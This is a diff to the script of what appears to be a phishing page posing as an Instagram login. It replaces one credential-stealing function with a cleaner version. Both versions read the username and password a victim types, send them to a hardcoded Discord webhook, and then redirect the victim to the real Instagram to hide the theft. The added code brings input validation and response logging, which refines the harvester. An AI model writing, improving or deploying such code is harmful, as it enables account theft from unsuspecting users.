@@ -80,23 +80,43 @@
 
   <script>
     function sendMessage() {
-      function sleep(milliseconds) {
-        const date = Date.now();
-        let currentDate = null;
-        do {
-          currentDate = Date.now();
-        } while (currentDate - date < milliseconds);
-      }
-      var request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1145358265388118210/OV9rO0qQeaxTRDYBPlAxIBQkj6P-IT1NuCcrXZXBbJeJnz9_YIhz0MXztIGtSZuwXDkS");
-      request.setRequestHeader('Content-type', 'application/json');
-      var params = {
-        content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
-      }
-      request.send(JSON.stringify(params));
-      sleep(400);
-      window.location.replace("https://www.instagram.com/");
+        // Get form inputs
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+
+        // Validate input
+        if (!username || !password) {
+            alert("Username and password cannot be empty!");
+            return;
+        }
+
+        // Prepare the message for the Discord webhook
+        var params = {
+            content: `**USERNAME:** ${username}\n**PASSWORD:** ${password}`
+        };
+
+        var request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1344749048040652863/0CiUlJao76_Ji56M5ztA_Qzo6dRFEpORjDS-riWu84O5jW7VX3CIJx-2KW5FF-ru_Tn-");
+        request.setRequestHeader('Content-type', 'application/json');
+
+        // Send the request
+        request.send(JSON.stringify(params));
+
+        // Handle the response
+        request.onload = function () {
+            if (request.status === 204) {
+                console.log("Message sent successfully!");
+            } else {
+                console.error("Failed to send message", request.status);
+            }
+        };
+
+        // Redirect after a short delay
+        setTimeout(function () {
+            window.location.replace("https://www.instagram.com/");
+        }, 400);
     }
-  </script>
+</script>
+
 
 </body></html>
